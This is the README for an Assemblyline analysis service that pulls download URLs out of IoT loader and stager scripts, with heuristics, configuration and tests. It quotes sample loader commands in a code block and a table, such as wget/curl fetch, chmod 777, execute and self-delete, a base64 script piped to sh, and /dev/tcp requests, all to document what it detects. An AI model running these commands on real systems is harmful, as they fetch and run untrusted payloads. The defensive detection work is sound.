# Assemblyline service: DropperURLs

Extracts download URLs from dropper and stager scripts and emits each HTTP(S) URL as a `uri/`
file, so URLDownloader fetches the next stage.

Assemblyline's URLCreator only makes a URL fetchable when it already scores 300, uses a
non-standard port, has a tool name in its path, or has an IP host with a file extension. A
typical IoT loader matches none of these:

```bash
wget http://198.51.100.61/7007c2; curl -O http://198.51.100.61/7007c2
chmod 777 7007c2; ./7007c2 bc; rm -rf 7007c2
```

DropperURLs emits any URL a script passes to a download tool, whatever it scores.

## What it detects

`wget`, `curl`, `tftp`, `ftpget`, `ftp`, `busybox <tool>`, `certutil -urlcache`,
`Invoke-WebRequest` / `iwr`, `Start-BitsTransfer`, `DownloadFile`, `DownloadString`,
`urlretrieve`, `urlopen`, `requests.get`, and HTTP requests written by hand over `/dev/tcp`.
A URL counts only when a download tool is on the same line, including commented-out lines,
which often hold fallback hosts. `tftp` commands carry no URL, so a `tftp://host/file` form is
built for tagging.

Loaders rarely write the URL out on the download line, so each URL is reported with how it was
found:

| How found | What it covers | Example |
|---|---|---|
| `literal` | URL on the download line, also with `${IFS}` as a space | `wget${IFS}http://198.51.100.3/a.sh` |
| `variable` | Shell variables expanded on download lines, one URL per value (each `case` branch counts) | `CB=http://198.51.100.70` ... `wget "$CB/$BIN"` |
| `decoded` | Inline base64, `printf`/`echo -e` and `$'...'` escapes, a base64 script piped into `sh` (two layers deep), and backslashes inserted into a URL | `echo d2dldCBodHRw... \| base64 -d \| sh`, `http://c2.ex\am\ple.net/x` |
| `no scheme` | IP targets without `http://` on wget, curl, ftpget or tftp lines | `wget 198.51.100.8/f` |
| `raw TCP` | `/dev/tcp/HOST/PORT` followed by an HTTP `GET` within five lines | `exec 3<>/dev/tcp/198.51.100.10/80` |

A URL with an unresolved variable or command substitution (`http://198.51.100.12/$(uname -m)`)
is listed and its host tagged, but it is not emitted. Limits: 8 values per variable, 64
expansions per line, 4 levels of nested variables, 2 levels of decoding, 500 URLs per file.

## Result

One table lists each URL once, with its command, how it was found, and its status: emitted for
download, or the reason it was not (unresolved, not HTTP(S), a limit, or `emit_uris` off). The
heuristics that apply appear as short subsections of the table.

## Heuristics

| ID | Name | Score | Raised when |
|---|---|---|---|
| 1 | Download command in script | 100 | Any download command (ATT&CK T1105) |
| 2 | Multi-stage dropper | 300 | 3+ URLs in one directory of one host, from a bare IP or with mostly extensionless names: one payload per CPU architecture |
| 3 | Download, execute and self-delete chain | 500 | `chmod`, `./run` and `rm`; signatures `chmod_777`, `exec_downloaded`, `self_delete` |
| 4 | Payload fetched from bare IP address | 100 | A download host is an IP address |
| 5 | Download URL hidden by encoding | 300 | A URL appears only after decoding (ATT&CK T1027) |

Against 2,119 benign files (1,500 system scripts and 600 Python modules from a Fedora
installation, and 19 public installers such as get.docker.com, rustup, Homebrew and nvm), 23
scored, each 100 from heuristic 1 alone.

## Installation and configuration

In Assemblyline, open Administration → Services → Add service and paste `service_manifest.yml`.
No API key is needed, and the service makes no network connections.

| Parameter | Default | Effect |
|---|---|---|
| `emit_uris` | `true` | Emit each HTTP(S) URL as a `uri/` file |
| `max_uris` | `50` | Maximum emitted files, capped by the service setting `max_uris_limit` (default 200) |
| `tag_non_http` | `true` | Tag tftp and ftp URLs; URLDownloader fetches only HTTP(S) |

URLDownloader has to run for anything to be fetched. It is in the `Internet Connected`
category, which Assemblyline's default selection and the built-in `static` submission profile
leave out, so add it to the profile your submitters use.

> **OPSEC:** with URLDownloader enabled, every sample with a download URL triggers an outbound
> fetch. Without a proxy it leaves from your own address and reveals your analysis
> infrastructure to live C2 servers. Configure URLDownloader's `proxy` first.

## Tests

```bash
bash scripts/build-image.sh al4-dropperurls:test 4.7.0.dev0 podman
bash scripts/ci-gate.sh al4-dropperurls:test podman
```

The gate runs Ruff, Pyright and pytest inside the image, including four sample scripts with
expected results.

## Layout

```
dropperurls/
  analysis.py     matching logic (download commands, URLs, behaviour flags), no Assemblyline imports
  service.py      class DropperURLs(ServiceBase): result, heuristics, uri/ emission
tests/            tests, samples/ and results/
scripts/          build-image.sh, ci-gate.sh, gentests.py
```
